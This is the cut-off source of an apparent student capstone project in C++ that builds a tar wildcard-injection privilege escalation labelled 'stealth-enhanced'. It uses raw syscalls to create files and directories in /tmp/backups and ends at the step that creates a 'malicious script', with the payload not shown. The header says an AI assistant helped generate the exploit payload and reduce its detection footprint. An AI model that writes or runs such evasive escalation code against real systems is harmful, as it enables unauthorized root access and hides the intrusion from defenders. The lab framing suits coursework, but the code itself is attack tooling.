/*
 * COMPSCI564 - Cyber Effects Capstone Project
 * Tar Wildcard Privilege Escalation Implementation (Stealth-Enhanced)
 * 
 * AI Assistance Attribution:
 * This code was developed with assistance from Claude (Anthropic) for:
 * - File creation via direct syscalls
 * - Randomized timing patterns
 * - Exploit payload generation
 * - Minimal detection footprint
 * 
 * Technique: Tar wildcard injection to execute arbitrary commands
 * Reference: https://www.exploit-db.com/papers/33930
 * For educational use in controlled lab environment only.
 */

#include "privesc.h"
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>       // FIXED: Added for CLOCK_REALTIME
#include <cstring>

// ============================================================================
// MINIMAL STRING HELPERS
// ============================================================================

static int str_copy(char* dst, const char* src, int max_len) {
    int i = 0;
    while (i < max_len - 1 && src[i]) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

static int str_concat(char* dst, const char* src, int max_len) {
    int dst_len = 0;
    while (dst[dst_len]) dst_len++;
    
    int i = 0;
    while (dst_len + i < max_len - 1 && src[i]) {
        dst[dst_len + i] = src[i];
        i++;
    }
    dst[dst_len + i] = '\0';
    return dst_len + i;
}

// ============================================================================
// FILE OPERATIONS
// ============================================================================

// Create a file with specified content using syscalls
static bool create_file(const char* path, const char* content, mode_t mode) {
    // Open file with O_CREAT | O_WRONLY | O_TRUNC
    int fd = syscall(SYS_open, path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fd < 0) {
        return false;
    }
    
    // Write content
    size_t content_len = 0;
    while (content[content_len]) content_len++;
    
    ssize_t written = syscall(SYS_write, fd, content, content_len);
    syscall(SYS_close, fd);
    
    return (written == (ssize_t)content_len);
}

// Create directory if it doesn't exist
static bool ensure_directory(const char* path) {
    struct stat st;
    
    // Check if directory exists
    if (syscall(SYS_stat, path, &st) == 0) {
        // Exists - check if it's a directory
        return S_ISDIR(st.st_mode);
    }
    
    // Create directory with permissions 0755
    if (syscall(SYS_mkdir, path, 0755) == 0) {
        return true;
    }
    
    return false;
}

// ============================================================================
// PRIVILEGE ESCALATION EXECUTION (STEALTH-ENHANCED)
// ============================================================================

int execute_tar_privesc() {
    const char* backups_dir = "/tmp/backups";
    
    // ========================================================================
    // Step 1: Ensure /tmp/backups directory exists
    // ========================================================================
    if (!ensure_directory(backups_dir)) {
        return -1;
    }
    
    // ========================================================================
    // Step 2: Change to /tmp/backups directory
    // ========================================================================
    if (syscall(SYS_chdir, backups_dir) != 0) {
        return -1;
    }
    
    // ========================================================================
    // Step 3: Create malicious script (tests.sh)
    // ========================================================================
    // 
